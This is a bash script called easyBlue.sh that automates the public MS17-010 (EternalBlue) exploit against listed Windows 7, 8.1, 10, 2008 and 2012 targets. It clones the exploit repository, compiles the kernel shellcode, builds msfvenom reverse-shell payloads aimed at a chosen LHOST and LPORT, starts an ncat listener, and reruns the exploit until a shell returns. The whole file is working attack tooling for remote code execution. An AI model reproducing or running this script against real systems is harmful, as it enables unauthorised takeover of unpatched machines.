#!/bin/bash

# easyBlue.sh was created to take some of the typing out of 
# exploiting machines using Worawit's public exploit code 
# found on git (https://github.com/worawit/MS17-010)

# I found this to be handy when Metasploit Framework doesn't 
# pop shell.

cleanup() {

##########################################################
# Cleaning up from previous use                          #
##########################################################
rm $eblue_dir_working/sc_x86_msf.bin 2>/dev/null
rm $eblue_dir_working/sc_x64_msf.bin 2>/dev/null
rm $eblue_dir_working/sc_x86.bin 2>/dev/null
rm $eblue_dir_working/sc_x64.bin 2>/dev/null
rm $eblue_dir_working/shellcode/sc_x86_msf.bin 2>/dev/null
rm $eblue_dir_working/shellcode/sc_x64_msf.bin 2>/dev/null
rm $eblue_dir_working/shellcode/sc_x86.bin 2>/dev/null
rm $eblue_dir_working/shellcode/sc_x64.bin 2>/dev/null

echo "Done"
sleep 2
main

}

dir_set() {

clear
echo
echo "====================================================================================="
echo "    ***Enter working/install directory or leave blank to use current directory***"
echo "====================================================================================="
read -p "[-] Please enter WORKING_DIR...>" userDir
echo "[-]"
if [[ "$userDir" = "" ]]
	then
		eblue_dir=$(pwd)
		eblue_dir_working="$eblue_dir/MS17-010"
else
eblue_dir=$userDir
eblue_dir_working="$eblue_dir/MS17-010"
fi 
echo "[-] easyBlue files located in > $eblue_dir_working


"
read -p "Press ENTER to continue"
main

}

download() {
clear
echo "
=================================================
    ***Worawit MS17-010 Download and Setup***
=================================================

"
echo "[-] Cloning exploit from https://github.com/worawit/MS17-010" 
git clone https://github.com/worawit/MS17-010.git $eblue_dir_working
echo "[-] Exploit saved in $eblue_dir_working"
echo "[-] DONE!"
echo "[-] Making scripts executable"
#chmod +x $eblue_dir_working/*.py 
#chmod +x $eblue_dir_working/shellcode/*.py 
chmod +x $eblue_dir_working/*.py
chmod +x $eblue_dir_working/shellcode/*.py
echo "[-] DONE!"
echo "[-] Creating shellcode binaries
[-] Creating 64-bit binary (nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin)"
nasm -f bin $eblue_dir_working/shellcode/eternalblue_kshellcode_x64.asm -o $eblue_dir_working/shellcode/sc_x64_kernel.bin 
echo "[-] DONE!
[-] Creating 32-bit binary (nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin)"
nasm -f bin $eblue_dir_working/shellcode/eternalblue_kshellcode_x86.asm -o $eblue_dir_working/shellcode/sc_x86_kernel.bin
echo "[-] DONE!
[-] =================================================

" 
read -p "[!] Press ENTER to return to Main menu"
main
}

checker() {
clear

echo "
============================================================
    ***Checking $RHOST for MS17-010 vulnerability***
============================================================


"
read -p "
[-] Do you want to try
[-] ====================================================================
[-] 1)NULL
[-] 2)Guest
[-] 3)SMBUSER/SMBPASS?


eblue(checker)> " smb_user_checker
 
case $smb_user_checker in 
	1)	echo "[-] Attempting with NULL Session " 
		;;
	2)	sed -i -e "s,USERNAME='',USERNAME='Guest'," $eblue_dir_working/checker.py 
		;;
	3)	sed -i -e "s,USERNAME='','"$SMBUSER"'," $eblue_dir_working/checker.py 
		;;
	*)	read -p "[-] Invlaid option. Press ENTER to try again"
		checker 
		;;
esac

python $eblue_dir_working/checker.py $RHOST

echo "
[-] DONE!"
read -p "[-] Continue to shellcode creation? [Y/n] " checker_choice
if [[ "$checker_choice" = "" ]]
then
	architecture
else
	case $checker_choice in 
		y|Y)	architecture ;;
		n|N)	main ;;
		*)		echo "[!] Invalid option. Returning to Main menu" 
				main 
				;;
	esac
fi		
}

exploit() {

NUMGROOM=13

	revshell() {
		gnome-terminal -- /bin/bash -c "echo '[-] Wating for shell connection...';echo '[-] ======================================================'; echo;ncat -vnl $LPORT"
	}

	
clear
LHOST
	prompt() {

	if [[ "$stager_final" = "staged" ]] && [[ "$arch" = "x64" ]]
	then
		read -p "easyBlue (exploit/staged/x64)> " win_version
	elif [[ "$stager_final" = "unstaged" ]] && [[ "$arch" = "x64" ]]
	then
		read -p "easyBlue (exploit/unstaged/x64)> " win_version
	elif [[ "$stager_final" = "staged" ]] && [[ "$arch" = "x32" ]]
	then
		read -p "easyBlue (exploit/staged/x32)> " win_version
	elif [[ "$stager_final" = "unstaged" ]] && [[ "$arch" = "x32" ]]
	then
		read -p "easyBlue (exploit/unstaged/x32)> " win_version
	else
	echo "[!] There has been an error! Returning to Main menu."
	main 
fi
	}

echo "
======================================================
        ***easyBlue MS17-010 Exploit Module***
======================================================

[-] Choose option number or type X to exit.

[1] Windows 7 SP1 x64
[2] Windows 7 SP1 x86
[3] Windows 2008 SP1 x64
[4] Windows 2008 SP1 x86
[5] Windows 2008 R2 SP1 x64
[6] Windows 2012 R2 x64
[7] Windows 8.1 x64
[8] Windows 10 Pro Build 10240 x64



"
prompt

if [[ "$win_version" = [1,3,5] ]]
	then
		revshell
		iter=1
		until [ $iter -eq 2 ]
		do
			cat $eblue_dir_working/shellcode/sc_x64_kernel.bin $eblue_dir_working/sc_x64_msf.bin > $eblue_dir_working/sc_x64.bin
			python $eblue_dir_working/eternalblue_exploit7.py $RHOST $eblue_dir_working/sc_x64.bin $NUMGROOM
			read -p "[-] Did you get shell? [y/N] " success
			echo "[-]"
			echo "[-]"
			if [[ "$success" = "" ]]
				then
					NUMGROOM=$[ $NUMGROOM + 5 ]
					echo "[-] Rerunning exploit with increased numGroomConn"
			else 
					case $success in
						y|Y)	echo "[-] You are 1337 H4X0R! ;)" 
								iter=2
								;;
						n|N)	NUMGROOM=$[ $NUMGROOM + 5 ]
								echo "[-] Rerunning exploit with increased numGroomConn"
								;;
						*)		echo "[-] Ivalid option"
								;;
					esac
			fi
		done
		main
elif [[ "$win_version" = [2,4] ]]
	then
		revshell
		iter=1
		until [ $iter -eq 2 ]
		do
			cat $eblue_dir_working/shellcode/sc_x86_kernel.bin $eblue_dir_working/sc_x86_msf.bin > $eblue_dir_working/sc_x86.bin
			python $eblue_dir_working/eternalblue_exploit7.py $RHOST $eblue_dir_working/sc_x86.bin $NUMGROOM
			read -p "[-] Did you get shell? [y/N] " success
			echo "[-]"
			echo "[-]"
			if [[ "$success" = "" ]]
				then
					NUMGROOM=$[ $NUMGROOM + 5 ]
					echo "[-] Rerunning exploit with increased numGroomConn"
			else 
					case $success in
						y|Y)	echo "[-] You are 1337 H4X0R! ;)" 
								iter=2
								;;
						n|N)	NUMGROOM=$[ $NUMGROOM + 5 ]
								echo "[-] Rerunning exploit with increased numGroomConn"
								;;
						*)		echo "[-] Ivalid option"
								;;
					esac
			fi
		done
		main
elif [[ "$win_version" = [6,7,8] ]]
	then
		revshell
		read -p "[-] Do you want to try 1)NULL, 2)Guest, or 3)SMBUSER/SMBPASS? > " smb_user_attack
			case $smb_user_attack in 
				1)	echo "[-] Attempting anonymous access " ;;
				2)	sed -i -e "s,USERNAME='',USERNAME='Guest'," $eblue_dir_working/eternalblue_exploit8.py ;;
				3)	sed -i -e "s,USERNAME='','"$SMBUSER"'," $eblue_dir_working/eternalblue_exploit8.py ;;
				*)	read -p "[-] Invlaid option. Press ENTER to try again" ;;
			esac
		iter=1
		until [ $iter -eq 2 ]
		do
			cat $eblue_dir_working/shellcode/sc_x64_kernel.bin $eblue_dir_working/sc_x64_msf.bin > $eblue_dir_working/sc_x64.bin
			python $eblue_dir_working/eternalblue_exploit8.py $RHOST $eblue_dir_working/sc_x64.bin $NUMGROOM
			read -p "[-] Did you get shell? [y/N] " success
			echo "[-]"
			echo "[-]"
			if [[ "$success" = "" ]]
				then
					NUMGROOM=$[ $NUMGROOM + 5 ]
					echo "[-] Rerunning exploit with increased numGroomConn"
			else
				case $success in
					y|Y)	echo "[-] You are 1337 H4X0R! ;)" 
							cp $eblue_dir_working/eternalblue_exploit8.bak $eblue_dir_working/eternalblue_exploit8.py
							iter=2
							;;
					n|N)	NUMGROOM=$[ $NUMGROOM + 5 ]
							echo "[-] Rerunning exploit with increased numGroomConn"
							;;
					*)		echo "[-] Ivalid option"
							;;
				esac
			fi
		done
		main
elif [[ "$win_version" == [x,X] ]]
	then
		main
else 
	read -p "There was an error. Press ENTER to return to Main menu"
	main 
fi


}

stager() {

	stage_to_exploit() {

		echo "[-]
[-]
[-] Continue to Exploit [Y/n]? 



		"
		read -p "easyBlue (stager)> " toExploit
		if [[ "$toExploit" = "" ]]
		then
			exploit
		else
			case $checker_choice in 
				y|Y)	exploit ;;
				n|N)	main ;;
				*)		echo "[!] Invalid option. Returning to Main menu" ;;
			esac
		fi

	}

echo "
[-]
[-] Staged or Unstaged payload?
[-] ==================================================
[-] 
[1] Staged
[2] Unstaged


" 
read -p "easyBlue (stager)> " stager_choice
echo
case $stager_choice in 
	1)	stager_final="staged" ;;
	2)	stager_final="unstaged" ;;
	*)	echo "[!] Invalid option"
		sleep 2
		stager 
		;;
esac

if [[ "$stager_final" = "staged" ]] && [[ "$arch" = "x64" ]]
	then
		$x64_staged
		stage_to_exploit
elif [[ "$stager_final" = "unstaged" ]] && [[ "$arch" = "x64" ]]
	then
		$x64_unstaged
		stage_to_exploit
elif [[ "$stager_final" = "staged" ]] && [[ "$arch" = "x32" ]]
	then
		$x32_staged
		stage_to_exploit
elif [[ "$stager_final" = "unstaged" ]] && [[ "$arch" = "x32" ]]
	then
		$x32_unstaged
		stage_to_exploit
else
	echo "[!] There has been an error! Returning to Main menu."
	main 
fi
}

architecture() {

clear
echo "
======================================================
    ***Creating shellcode payload with MSFVenom***
======================================================

[-] Choose option number or type X to exit.

[1] 64-bit Target
[2] 32-bit Target

[X] Exit


"

read -p "easyBlue (architecture)> " arch_choice

case $arch_choice in
	1)	arch="x64"
		stager ;;
	2)	arch="x32"
		stager ;;
	x|X|exit|Exit)	main ;;
	*)	echo "Invalid option"
		sleep 2
		architecture
		;;
esac
}

target() {

echo "
[-] Gathering Target Info (Press ENTER to leave skip)
======================================================

"
read -p "[-] Please enter RHOST...> " RHOST
read -p "[-] Please enter LHOST...> " LHOST
read -p "[-] Please enter LPORT...> " LPORT
echo "[-]"
read -p "[-] Please enter SMBUSER...> " SMBUSER
read -p "[-] Please enter SMBPASS...> " SMBPASS
echo "[-]"
read -p "Press ENTER to continue"
main
}


main() {

x64_unstaged="msfvenom -p windows/x64/shell_reverse_tcp -f raw -o $eblue_dir_working/sc_x64_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT"
x64_staged="msfvenom -p windows/x64/shell/reverse_tcp -f raw -o $eblue_dir_working/sc_x64_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT"
x32_unstaged="msfvenom -p windows/shell_reverse_tcp -f raw -o $eblue_dir_working/sc_x86_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT"
x32_staged="msfvenom -p windows/shell/reverse_tcp -f raw -o $eblue_dir_working/sc_x86_msf.bin EXITFUNC=thread LHOST=$LHOST LPORT=$LPORT"

cp $eblue_dir_working/eternalblue_exploit8.py $eblue_dir_working/eternalblue_exploit8.bak
cp $eblue_dir_working/eternalblue_exploit7.py $eblue_dir_working/eternalblue_exploit7.bak
cp $eblue_dir_working/checker.py $eblue_dir_working/checker.bak

clear

echo "
=================================================
    ***easyBlue MS17-010 Exploit Framework***
=================================================

[-] Choose option number or type X to exit.

[1] Download and setup worawit's MS17-010 exploit
[2] Set Options (RHOST, LHOST, LPORT, SMBUSER, SMBPASS)
[3] Test target for MS17-010 vulnerability
[4] Exploit target
[5] Reset download/install directory
[6] Cleanup files from previous run

[X] Exit


"

read -p "easyBlue> " main_choice

case $main_choice in
	1)	download ;;
	2)	target ;;
	3)	checker ;;
	4)	architecture ;;
	5)	dir_set ;;
	6)	cleanup ;;
	x|X|exit|Exit)	clear
					exit
					;;
	t) tester ;;
	*)	echo "Invalid option"
		sleep 2
		main
		;;
esac

}

#############################################


dir_set